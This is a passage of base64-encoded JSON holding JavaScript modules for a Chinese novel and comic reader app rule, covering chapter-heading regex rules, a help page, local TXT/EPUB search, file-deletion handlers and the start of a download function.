FxcXCJzZXJpYWxOdW1iZXJcXFxcXFxcIjogMTJcXFxcbiAgICB9LFxcXFxuICAgIHtcXFxcbiAgICAgICAgXFxcXFxcXCJpZFxcXFxcXFwiOiAtMTUsXFxcXG4gICAgICAgIFxcXFxcXFwiZW5hYmxlXFxcXFxcXCI6IHRydWUsXFxcXG4gICAgICAgIFxcXFxcXFwibmFtZVxcXFxcXFwiOiBcXFxcXFxcIueroC/ljbcg5bqP5Y+3IOagh+mimFxcXFxcXFwiLFxcXFxuICAgICAgICBcXFxcXFxcInJ1bGVcXFxcXFxcIjogXFxcXFxcXCJeWyBcXFxcXFxcXFxcXFxcXFxcdOOAgF17MCw0fSg/Oig/OuWGheWuuXzmlofnq6ApP+eugOS7i3zmlofmoYh85YmN6KiAfOW6j+eroHzmpZTlrZB85q2j5paHKD8h5a6MfOe7kyl857uI56ugfOWQjuiusHzlsL7lo7B855Wq5aSWfFvljbfnq6BdW1xcXFxcXFxcXFxcXFxcXFxk44CH6Zu25LiA5LqM5Lik5LiJ5Zub5LqU5YWt5LiD5YWr5Lmd5Y2B55m+5Y2D5LiH5aO56LSw5Y+B6IKG5LyN6ZmG5p+S5o2M546W5ou+5L2w5LufXXsxLDh9KVsg44CAXXswLDR9LnswLDMwfSRcXFxcXFxcIixcXFxcbiAgICAgICAgXFxcXFxcXCJleGFtcGxlXFxcXFxcXCI6IFxcXFxcXFwi5Y235LqUIOW8gOa6kOebm+S4llxcXFxcXFwiLFxcXFxuICAgICAgICBcXFxcXFxcInNlcmlhbE51bWJlclxcXFxcXFwiOiAxM1xcXFxuICAgIH0sXFxcXG4gICAge1xcXFxuICAgICAgICBcXFxcXFxcImlkXFxcXFxcXCI6IC0xNixcXFxcbiAgICAgICAgXFxcXFxcXCJlbmFibGVcXFxcXFxcIjogZmFsc2UsXFxcXG4gICAgICAgIFxcXFxcXFwibmFtZVxcXFxcXFwiOiBcXFxcXFxcIumhtuagvOagh+mimFxcXFxcXFwiLFxcXFxuICAgICAgICBcXFxcXFxcInJ1bGVcXFxcXFxcIjogXFxcXFxcXCJeXFxcXFxcXFxcXFxcXFxcXFMuezEsMjB9JFxcXFxcXFwiLFxcXFxuICAgICAgICBcXFxcXFxcImV4YW1wbGVcXFxcXFxcIjogXFxcXFxcXCLkuI3otoXov4cyMOS4quWtl+mhtuagvOWGmeeahOmDveaYr+agh+mimFxcXFxcXFwiLFxcXFxuICAgICAgICBcXFxcXFxcInNlcmlhbE51bWJlclxcXFxcXFwiOiAxNFxcXFxuICAgIH0sXFxcXG4gICAge1xcXFxuICAgICAgICBcXFxcXFxcImlkXFxcXFxcXCI6IC0xNyxcXFxcbiAgICAgICAgXFxcXFxcXCJlbmFibGVcXFxcXFxcIjogZmFsc2UsXFxcXG4gICAgICAgIFxcXFxcXFwibmFtZVxcXFxcXFwiOiBcXFxcXFxcIuWPjOagh+mimCjliY3lkJEpXFxcXFxcXCIsXFxcXG4gICAgICAgIFxcXFxcXFwicnVsZVxcXFxcXFwiOiBcXFxcXFxcIig/bSkoPzw9WyBcXFxcXFxcXFxcXFxcXFxcdOOAgF17MCw0fSnnrKxbXFxcXFxcXFxcXFxcXFxcXGTjgIfpm7bkuIDkuozkuKTkuInlm5vkupTlha3kuIPlhavkuZ3ljYHnmb7ljYPkuIflo7notLDlj4HogobkvI3pmYbmn5LmjYznjpbmi77kvbDku59dezEsOH3nq6AuezAsMzB9JCg/PVtcXFxcXFxcXFxcXFxcXFxcc+OAgF17MCw4feesrFtcXFxcXFxcXFxcXFxcXFxcZOmbtuS4gOS6jOS4pOS4ieWbm+S6lOWFreS4g+WFq+S5neWNgeeZvuWNg+S4h+Wjuei0sOWPgeiChuS8jemZhuafkuaNjOeOluaLvuS9sOS7n117MSw4feeroClcXFxcXFxcIixcXFxcbiAgICAgICAgXFxcXFxcXCJleGFtcGxlXFxcXFxcXCI6IFxcXFxcXFwi56ys5LiA56ugIOecn+ato+eahOagh+mimOW5tuWBh+ijheaNouihjOesrOS4gOeroCDov5nkuKrkuI3opoFcXFxcXFxcIixcXFxcbiAgICAgICAgXFxcXFxcXCJzZXJpYWxOdW1iZXJcXFxcXFxcIjogMTVcXFxcbiAgICB9LFxcXFxuICAgIHtcXFxcbiAgICAgICAgXFxcXFxcXCJpZFxcXFxcXFwiOiAtMTgsXFxcXG4gICAgICAgIFxcXFxcXFwiZW5hYmxlXFxcXFxcXCI6IGZhbHNlLFxcXFxuICAgICAgICBcXFxcXFxcIm5hbWVcXFxcXFxcIjogXFxcXFxcXCLlj4zmoIfpopgo5ZCO5ZCRKVxcXFxcXFwiLFxcXFxuICAgICAgICBcXFxcXFxcInJ1bGVcXFxcXFxcIjogXFxcXFxcXCIoP20pKD88PVsgXFxcXFxcXFxcXFxcXFxcXHTjgIBdezAsNH3nrKxbXFxcXFxcXFxcXFxcXFxcXGTjgIfpm7bkuIDkuozkuKTkuInlm5vkupTlha3kuIPlhavkuZ3ljYHnmb7ljYPkuIflo7notLDlj4HogobkvI3pmYbmn5LmjYznjpbmi77kvbDku59dezEsOH3nq6AuezAsMzB9JFtcXFxcXFxcXFxcXFxcXFxcc+OAgF17MCw4fSnnrKxbXFxcXFxcXFxcXFxcXFxcXGTpm7bkuIDkuozkuKTkuInlm5vkupTlha3kuIPlhavkuZ3ljYHnmb7ljYPkuIflo7notLDlj4HogobkvI3pmYbmn5LmjYznjpbmi77kvbDku59dezEsOH3nq6AuezAsMzB9JFxcXFxcXFwiLFxcXFxuICAgICAgICBcXFxcXFxcImV4YW1wbGVcXFxcXFxcIjogXFxcXFxcXCLnrKzkuIDnq6Ag6L+Z5Liq5qCH6aKY5LiN6KaB5bm25YGH6KOF5o2i6KGM56ys5LiA56ug55yf5q2j55qE5qCH6aKYXFxcXFxcXCIsXFxcXG4gICAgICAgIFxcXFxcXFwic2VyaWFsTnVtYmVyXFxcXFxcXCI6IDE2XFxcXG4gICAgfSxcXFxcbiAgICB7XFxcXG4gICAgICAgIFxcXFxcXFwiaWRcXFxcXFxcIjogLTE5LFxcXFxuICAgICAgICBcXFxcXFxcImVuYWJsZVxcXFxcXFwiOiB0cnVlLFxcXFxuICAgICAgICBcXFxcXFxcIm5hbWVcXFxcXFxcIjogXFxcXFxcXCLkuablkI0g5ous5Y+3IOW6j+WPt1xcXFxcXFwiLFxcXFxuICAgICAgICBcXFxcXFxcInJ1bGVcXFxcXFxcIjogXFxcXFxcXCJeLnsxLDIwfVso77yIXVtcXFxcXFxcXFxcXFxcXFxcZOOAh+mbtuS4gOS6jOS4pOS4ieWbm+S6lOWFreS4g+WFq+S5neWNgeeZvuWNg+S4h+Wjuei0sOWPgeiChuS8jemZhuafkuaNjOeOluaLvuS9sOS7n117MSw4fVsp77yJXVsg44CAXFxcXFxcXFx0XXswLDR9JFxcXFxcXFwiLFxcXFxuICAgICAgICBcXFxcXFxcImV4YW1wbGVcXFxcXFxcIjogXFxcXFxcXCLmoIfpopjlkI7pnaLmlbDlrZfmnInmi6zlj7coMTIpXFxcXFxcXCIsXFxcXG4gICAgICAgIFxcXFxcXFwic2VyaWFsTnVtYmVyXFxcXFxcXCI6IDE3XFxcXG4gICAgfSxcXFxcbiAgICB7XFxcXG4gICAgICAgIFxcXFxcXFwiaWRcXFxcXFxcIjogLTIwLFxcXFxuICAgICAgICBcXFxcXFxcImVuYWJsZVxcXFxcXFwiOiB0cnVlLFxcXFxuICAgICAgICBcXFxcXFxcIm5hbWVcXFxcXFxcIjogXFxcXFxcXCLkuablkI0g5bqP5Y+3XFxcXFxcXCIsXFxcXG4gICAgICAgIFxcXFxcXFwicnVsZVxcXFxcXFwiOiBcXFxcXFxcIl4uezEsMjB9W1xcXFxcXFxcXFxcXFxcXFxk44CH6Zu25LiA5LqM5Lik5LiJ5Zub5LqU5YWt5LiD5YWr5Lmd5Y2B55m+5Y2D5LiH5aO56LSw5Y+B6IKG5LyN6ZmG5p+S5o2M546W5ou+5L2w5LufXXsxLDh9WyDjgIBcXFxcXFxcXHRdezAsNH0kXFxcXFxcXCIsXFxcXG4gICAgICAgIFxcXFxcXFwiZXhhbXBsZVxcXFxcXFwiOiBcXFxcXFxcIuagh+mimOWQjumdouaVsOWtl+ayoeacieaLrOWPtzEyNFxcXFxcXFwiLFxcXFxuICAgICAgICBcXFxcXFxcInNlcmlhbE51bWJlclxcXFxcXFwiOiAxOFxcXFxuICAgIH1cXFxcbl07XFxcXG5sZXQgTWF0Y2hlciA9IGphdmEudXRpbC5yZWdleC5NYXRjaGVyO1xcXFxubGV0IFBhdHRlcm4gPSBqYXZhLnV0aWwucmVnZXguUGF0dGVybjtcXFxcblxcXFxuZnVuY3Rpb24gZ2V0VG9jUnVsZShjb250ZW50KSB7XFxcXG4gICAgbGV0IG1heENzID0gMTtcXFxcbiAgICBsZXQgdG9jUGF0dGVybiA9IG51bGw7XFxcXG4gICAgZm9yIChsZXQgdG9jUnVsZSBvZiBydWxlcykge1xcXFxuICAgICAgICBpZiAoIXRvY1J1bGUuZW5hYmxlKSBjb250aW51ZTtcXFxcbiAgICAgICAgbGV0IHBhdHRlcm4gPSBQYXR0ZXJuLmNvbXBpbGUodG9jUnVsZS5ydWxlLCBQYXR0ZXJuLk1VTFRJTElORSk7XFxcXG4gICAgICAgIGxldCBtYXRjaGVyID0gcGF0dGVybi5tYXRjaGVyKGNvbnRlbnQpO1xcXFxuICAgICAgICBsZXQgY3MgPSAwO1xcXFxuICAgICAgICB3aGlsZSAobWF0Y2hlci5maW5kKCkpIHtcXFxcbiAgICAgICAgICAgIGNzKys7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgaWYgKGNzID49IG1heENzKSB7XFxcXG4gICAgICAgICAgICBtYXhDcyA9IGNzO1xcXFxuICAgICAgICAgICAgdG9jUGF0dGVybiA9IHBhdHRlcm47XFxcXG4gICAgICAgIH1cXFxcbiAgICB9XFxcXG4gICAgcmV0dXJuIHRvY1BhdHRlcm47XFxcXG59XFxcXG4kLmV4cG9ydHMuZ2V0VG9jUnVsZSA9IGdldFRvY1J1bGU7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwiI1Yu5biu5YqpXFxcIixcXFwicGF0aFxcXCI6XFxcImhlbHAudmlld1xcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbmxldCBoZWxwVGV4dCA9IHtcXFxcbiAgICBcXFxcXFxcInR4dFxcXFxcXFwiOiBgXFxcXG4gICAgICAgIDxoMSBpZD1cXFxcXFxcInR4dOaYr+S7gOS5iFxcXFxcXFwiPlRYVOaYr+S7gOS5iD88L2gxPlxcXFxuICAgICAgICA8cD48YSBocmVmPVxcXFxcXFwiaHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS90eHQvMTIxNzMzMFxcXFxcXFwiPuaIkeW3sue7j+W4ruS9oOeZvuW6puS6hjwvYT7vvJvnroDljZXmnaXor7TlsLHmmK/kuIDnp43lgqjlrZjlsI/or7TnmoTmlofku7Yo5omp5bGV5ZCNOnR4dCnjgII8L3A+XFxcXG4gICAgICAgIDxoMSBpZD1cXFxcXFxcIuWmguS9leeUqOivpeWwj+eoi+W6j+mYheivu3R4dOWwj+ivtFxcXFxcXFwiPuWmguS9leeUqOivpeWwj+eoi+W6j+mYheivu3R4dOWwj+ivtD88L2gxPlxcXFxuICAgICAgICA8cD7lnKjkuLvpobXpnaIg4peJVFhUIOeVjOmdouS4i++8jOeCueWHu+WvvOWFpVRYVO+8jOmAieaLqeebruagh+Wwj+ivtOaWh+S7tih0eHTmlofku7bvvIw8ZW0+6K+l5pON5L2c5LiN5Lya5Yig6ZmkdHh05paH5Lu277yM6ICM5pivY29weeS4gOS7veWIsOWwj+eoi+W6j+eahOi3r+W+hOS4izwvZW0+Ke+8jOWvvOWFpeWQjuWGjeWcqCDil4lUWFQg55WM6Z2i5LiL6YCJ5oup5oOz6KaB6ZiF6K+755qE5bCP6K+05Y2z5Y+v44CCPC9wPlxcXFxuXFxcXG4gICAgYCxcXFxcbiAgICBcXFxcXFxcIm5vdmVsQ29taWNcXFxcXFxcIjogYFxcXFxuICAgICAgICA8aDEgaWQ9XFxcXFxcXCLov5nkuKrlsI/nqIvluo/mnInku4DkuYjnlKjvvJ9cXFxcXFxcIj7ov5nkuKrlsI/nqIvluo/mnInku4DkuYjnlKjvvJ88L2gxPlxcXFxuICAgICAgICA8dWw+XFxcXG4gICAgICAgIDxsaT48dT7ku6PnoIHkuIrkuLrlhbbku5blsI/nqIvluo8o5ryr55S757G7L+Wwj+ivtOexuynmj5DkvpvkuIvovb3mjqXlj6PjgII8L3U+PC9saT5cXFxcbiAgICAgICAgPGxpPjx1PuacrOS9k+WFheW9k+mYheivu+WZqO+8jOWPr+S7pea1j+iniOeUqOivpeWwj+eoi+W6j+aPkOS+m+eahOS4i+i9veaOpeWPoyjkuIrpnaIp77yM5LiL6L2955qE5ryr55S7L+Wwj+ivtOOAgjwvdT48L2xpPlxcXFxuICAgICAgICA8bGk+PHU+5o+Q5L6bVFhU5qC85byP5bCP6K+05paH5Lu26Kej5p6Q5Yqf6IO944CCPC91PlxcXFxuICAgICAgICA8aDEgaWQ9XFxcXFxcXCLkuLrku4DkuYjliJfooajph4zku4DkuYjpg73msqHnlKhcXFxcXFxcIj7kuLrku4DkuYjliJfooajph4zku4DkuYjpg73msqHnlKg/PC9oMT5cXFxcbiAgICAgICAgPHU+5Yid5qyh5L2/55So77yM5rKh5pyJ5b6I5q2j5bi45ZCn44CC8J+klDwvdT5cXFxcbiAgICAgICAgPGgxIGlkPVxcXFxcXFwi6K+l5aaC5L2V5re75Yqg5ryr55S75oiW5bCP6K+0XFxcXFxcXCI+6K+l5aaC5L2V5re75Yqg5ryr55S7KOaIluWwj+ivtCk/PC9oMT5cXFxcbiAgICAgICAgPHU+IOWcqOS4gOS4quacieS4i+i9veWKn+iDveeahOWwj+eoi+W6jyjmvKvnlLvnsbsv5bCP6K+057G7KeS4reS4i+i9veS4gOacrOa8q+eUuy/lsI/or7TvvIzov5Tlm57or6Xop4TliJnljbPlj6/mtY/op4jjgII8L3U+PC9saT5cXFxcbiAgICAgICAgPC91bD5cXFxcbiAgICBgXFxcXG59O1xcXFxuc2V0UGFnZVRpdGxlKFxcXFxcXFwi5biu5YqpXFxcXFxcXCIpO1xcXFxubGV0IGtleXdvcmQgPSBnZXRQYXJhbShcXFxcXFxcImtleXdvcmRcXFxcXFxcIik7XFxcXG5sZXQgdGV4dDtcXFxcbmlmIChrZXl3b3JkID09PSB1bmRlZmluZWQgfHwgISh0ZXh0ID0gaGVscFRleHRba2V5d29yZF0pKSB7XFxcXG4gICAgc2V0UmVzdWx0KFt7XFxcXG4gICAgICAgIHRpdGxlOiAnPGgxIHN0eWxlPVxcXFxcXFwidGV4dC1hbGlnbjogY2VudGVyO1xcXFxcXFwiPui1hOaWmeS4jeingeWSrzwvaDE+JyxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwicmljaF90ZXh0XFxcXFxcXCJcXFxcbiAgICB9XSk7XFxcXG59IGVsc2Uge1xcXFxuICAgIHNldFJlc3VsdChbe1xcXFxuICAgICAgICB0aXRsZTogdGV4dCxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwicmljaF90ZXh0XFxcXFxcXCJcXFxcbiAgICB9XSk7XFxcXG59XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcInRleHRfMVxcXCIsXFxcIm5hbWVcXFwiOlxcXCIjdi7lpJblr7zmkJzntKJcXFwiLFxcXCJwYXRoXFxcIjpcXFwidHh0U2VhcmNoLnZpZXdcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG5jb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFxcXFxcIik7XFxcXG5jb25zdCBDb25maWcgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvQ29uZmlnLmpzXFxcXFxcXCIpO1xcXFxuXFxcXG5sZXQgc2VhcmNoVGVybXMgPSBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcXFxcXCJzZWFyY2hUZXJtc1xcXFxcXFwiKSk7XFxcXG5zZXRQYWdlVGl0bGUoXFxcXFxcXCLjgIxcXFxcXFxcIiArIHNlYXJjaFRlcm1zICsgXFxcXFxcXCLjgI3nmoTmkJzntKLnu5PmnpxcXFxcXFxcIik7XFxcXG5sZXQgZGF0YSA9IEZpbGUuZ2V0RmlsZVBhdGgoQ29uZmlnLmV4dGVybmFsSW1wb3J0UGF0aCwgdW5kZWZpbmVkKTtcXFxcbmRhdGEgPSBkYXRhLmZpbHRlcih2ID0+IC8oXFxcXFxcXFwudHh0fFxcXFxcXFxcLmVwdWIpJC8udGVzdCh2Lm5hbWUpKTtcXFxcblxcXFxubGV0IHRlcm1zQXJyID0gc2VhcmNoVGVybXMuc3BsaXQoXFxcXFxcXCJcXFxcXFxcIikubWFwKHQgPT4gdC5yZXBsYWNlKC9cXFxcXFxcXCp8XFxcXFxcXFwufFxcXFxcXFxcP3xcXFxcXFxcXCt8XFxcXFxcXFwkfFxcXFxcXFxcXnxcXFxcXFxcXFt8XFxcXFxcXFxdfFxcXFxcXFxcKHxcXFxcXFxcXCl8XFxcXFxcXFx7fFxcXFxcXFxcfXxcXFxcXFxcXHx8XFxcXFxcXFwvfFxcXFxcXFxcXFxcXFxcXFwvZywgayA9PiBcXFxcXFxcIlxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcIiArIGspKTtcXFxcbmxldCByZWcgPSBuZXcgUmVnRXhwKHRlcm1zQXJyLmpvaW4oXFxcXFxcXCIuKlxcXFxcXFwiKSwgXFxcXFxcXCJpXFxcXFxcXCIpO1xcXFxubGV0IHNlYXJjaFJlc3VsdCA9IFtdO1xcXFxuZm9yIChsZXQgdHh0IG9mIGRhdGEpIHtcXFxcbiAgICBpZiAocmVnLnRlc3QodHh0Lm5hbWUpKSB7XFxcXG4gICAgICAgIGxldCB0eXBlID0gdHh0Lm5hbWUuc3Vic3RyaW5nKHR4dC5uYW1lLmxhc3RJbmRleE9mKFxcXFxcXFwiLlxcXFxcXFwiKSk7XFxcXG4gICAgICAgIHNlYXJjaFJlc3VsdC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiB0eHQubmFtZSxcXFxcbiAgICAgICAgICAgIHVybDogKHR5cGU9PT1cXFxcXFxcIi50eHRcXFxcXFxcIj9cXFxcXFxcImhpa2VyOi8vcGFnZS90eHRQYXJzZXIudmlld1xcXFxcXFwiOlxcXFxcXFwiaGlrZXI6Ly9wYWdlL2VwdWJQYXJzZXIudmlldyNhdXRvQ2FjaGUjXFxcXFxcXCIpK1xcXFxcXFwiP3J1bGU9XFxcXFxcXCIgKyBNWV9SVUxFLnRpdGxlLFxcXFxuICAgICAgICAgICAgZGVzYzogdHh0LnBhdGgsXFxcXG4gICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgIHBhdGg6IHR4dC5wYXRoLFxcXFxuICAgICAgICAgICAgICAgIGlzQ2FjaGU6IHRydWUsXFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHR4dC5uYW1lXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0pO1xcXFxuICAgIH1cXFxcbn1cXFxcbmlmIChzZWFyY2hSZXN1bHQubGVuZ3RoID09PSAwKSB7XFxcXG4gICAgc2VhcmNoUmVzdWx0LnB1c2goe1xcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJiaWdfYmlnX2JsYW5rX2Jsb2NrXFxcXFxcXCIsXFxcXG4gICAgfSwge1xcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJiaWdfYmlnX2JsYW5rX2Jsb2NrXFxcXFxcXCIsXFxcXG4gICAgfSwge1xcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJiaWdfYmlnX2JsYW5rX2Jsb2NrXFxcXFxcXCIsXFxcXG4gICAgfSwge1xcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJiaWdfYmlnX2JsYW5rX2Jsb2NrXFxcXFxcXCIsXFxcXG4gICAgfSwge1xcXFxuICAgICAgICB0aXRsZTogJzxoMiBzdHlsZT1cXFxcXFxcInRleHQtYWxpZ246IGNlbnRlcjtcXFxcXFxcIj7wn5SO5rKh5pyJ5om+5Yiw55u45YWz5Lmm57GNPC9oMj4nLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJyaWNoX3RleHRcXFxcXFxcIlxcXFxuICAgIH0pO1xcXFxufVxcXFxuc2V0UmVzdWx0KHNlYXJjaFJlc3VsdCk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwiI2Yu6ZW/5oyJL+eCueWHu1xcXCIsXFxcInBhdGhcXFwiOlxcXCJsb25nUHJlc3MuanNcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG4kLmV4cG9ydHMgPSB7XFxcXG4gICAgZGVsZXRlRmlsZUZvckJvb2socGF0aCkge1xcXFxuICAgICAgICAvL3JldHVybiAkKFxcXFxcXFwi5omA5pyJ55qEIOa8q+eUuy/lsI/or7Qg56ug6IqC5bCG6KKr5Yig6ZmkXFxcXFxcXFxt56Gu6K6k5Yig6Zmk77yfXFxcXFxcXCIpLmNvbmZpcm0oKHBhdGgpID0+IHtcXFxcbiAgICAgICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcXFxcXCIpO1xcXFxuICAgICAgICBpZiAoRmlsZS5kZWxldGVGaWxlcyhwYXRoKSkge1xcXFxuICAgICAgICAgICAgZGVsZXRlSXRlbShwYXRoKVxcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/liKDpmaTmiJDlip9cXFxcXFxcIjtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5Yig6Zmk5aSx6LSlXFxcXFxcXCI7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgLy99LCBwYXRoKTtcXFxcbiAgICB9LFxcXFxuICAgIGRlbGV0ZUZpbGVGb3JUeHQocGF0aCkge1xcXFxuICAgICAgICBjb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFxcXFxcIik7XFxcXG4gICAgICAgIGlmIChGaWxlLmRlbGV0ZUZpbGVzKHBhdGgpKSB7XFxcXG4gICAgICAgICAgICBpZiAoZmlsZUV4aXN0KFxcXFxcXFwiZmlsZTovL1xcXFxcXFwiICsgcGF0aCArIFxcXFxcXFwiLmpzb25cXFxcXFxcIikpIHtcXFxcbiAgICAgICAgICAgICAgICBGaWxlLmRlbGV0ZUZpbGVzKHBhdGggKyBcXFxcXFxcIi5qc29uXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgZGVsZXRlSXRlbShwYXRoKTtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5Yig6Zmk5oiQ5YqfXFxcXFxcXCI7XFxcXG4gICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+WIoOmZpOWksei0pVxcXFxcXFwiO1xcXFxuICAgICAgICB9XFxcXG4gICAgfSxcXFxcbiAgICBzaW5nbGVFbnRlcihwYWdlVXJsLCBwYXRoKSB7XFxcXG4gICAgICAgIGNvbnN0IEZpbGUgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qc1xcXFxcXFwiKTtcXFxcbiAgICAgICAgbGV0IGRpcnMgPSBGaWxlLmdldEZpbGVQYXRoKHBhdGgsIFxcXFxcXFwiZGlyXFxcXFxcXCIpO1xcXFxuICAgICAgICBpZiAoZGlycy5sZW5ndGggPT09IDEpIHtcXFxcbiAgICAgICAgICAgIGNvbnN0IENvbmZpZyA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9Db25maWcuanNcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBsZXQgZmkgPSBkaXJzWzBdLnBhdGg7XFxcXG4gICAgICAgICAgICBpZiAoQ29uZmlnLmRlZl9pc0NvbWljQ29tcGF0aWJsZSA9PT0gXFxcXFxcXCIwXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgZmlsZWxpc3QgPSBGaWxlLmdldEZpbGVQYXRoKGZpKTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgc2hvcnRlbiA9IGZpLnJlcGxhY2UoZ2V0UGF0aChcXFxcXFxcImhpa2VyOi8vZmlsZXMvXFxcXFxcXCIpLnNsaWNlKDcpLCBcXFxcXFxcImhpa2VyOi8vZmlsZXMvXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIGxldCBwaWNsaXN0ID0gZmlsZWxpc3QubWFwKChpdGVtLCBpKSA9PiBzaG9ydGVuICsgXFxcXFxcXCIvXFxcXFxcXCIgKyAoaSArIDEpICsgXFxcXFxcXCIuanBnXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInBpY3M6Ly9cXFxcXFxcIiArIHBpY2xpc3Quam9pbihcXFxcXFxcIiYmXFxcXFxcXCIpO1xcXFxuXFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vcGFnZS9jb21pY0NvbXBhdGlibGUudmlldyNhdXRvUGFnZSMjcmVhZFRoZW1lIz9wYXRoPVxcXFxcXFwiICsgZW5jb2RlVVJJQ29tcG9uZW50KGZpKTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBwYWdlVXJsICsgXFxcXFxcXCI/cnVsZT1cXFxcXFxcIiArIE1ZX1JVTEUudGl0bGVcXFxcbiAgICAgICAgfVxcXFxuICAgIH1cXFxcbn1cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCIjZmcu5LiL6L295Li756iL5bqPXFxcIixcXFwicGF0aFxcXCI6XFxcIm1haW5Eb3dubG9hZFxcXCIsXFxcInJ1bGVcXFwiOlxcXCJjb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFxcXFxcIik7XFxcXG5jb25zdCBDb25maWcgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvQ29uZmlnLmpzXFxcXFxcXCIpO1xcXFxuY29uc3QgVG9vbCA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9Ub29sLmpzXFxcXFxcXCIpO1xcXFxuXFxcXG5cXFxcbiQuZXhwb3J0cy5ub3ZlbCA9IGZ1bmN0aW9uIG5vdmVsKGl0ZW0sIGluZm8sIG9yZGVyLCBNWV9JRCwgaW50ZXJydXB0KSB7XFxcXG4gICAgbGV0IGlkID0gaW5mby5ib29rSWQgPyBcXFxcXFxcIiRcXFxcXFxcIiArIGluZm8uYm9va0lkIDogXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICBsZXQgbWFpblBhdGggPSBDb25maWcubm92ZWxQYXRoICsgXFxcXFxcXCIvXFxcXFxcXCIgKyBpbmZvLnJ1bGVOYW1lICsgXFxcXFxcXCIvXFxcXFxcXCIgKyBUb29sLnRleHRTaGllbGQoaW5mby5ib29rTmFtZSkgKyBpZCArIFxcXFxcXFwiL1xcXFxcXFwiO1xcXFxuICAgIGxldCBjaGFwdGVyUGF0aCA9IG1haW5QYXRoICsgb3JkZXIgKyBcXFxcXFxcIiRBJFxcXFxcXFwiICsgVG9vbC50ZXh0U2hpZWxkKGl0ZW0udGl0bGUpICsgXFxcXFxcXCIudHh0XFxcXFxcXCI7XFxcXG4gICAgbGV0IGNvbnRlbnQgPSBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuICAgIGlmIChpbnRlcnJ1cHQgJiYgZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpzdGF0dXNcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIikgPT09IFxcXFxcXFwiMVxcXFxcXFwiKSB7XFxcXG4gICAgICAgIHJldHVybiAtMTtcXFxcbiAgICB9XFxcXG4gICAgdHJ5IHtcXFxcbiAgICAgICAgbGV0IHNldFJlc3VsdCA9IGRhdGEgPT4ge1xcXFxuICAgICAgICAgICAgY29udGVudCA9IGRhdGFbMF0udGl0bGUgfHwgXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIGlmIChkYXRhLmxlbmd0aCA+IDEgJiYgZGF0YVsxXS50aXRsZSAmJiBkYXRhWzFdLnRpdGxlLmxlbmd0aCA+IGNvbnRlbnQubGVuZ3RoKSB7XFxcXG4gICAgICAgICAgICAgICAgY29udGVudCA9IGRhdGFbMV0udGl0bGU7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgbGV0IGdldFJlc0NvZGUgPSAoKSA9PiB7XFxcXG4gICAgICAgICAgICByZXR1cm4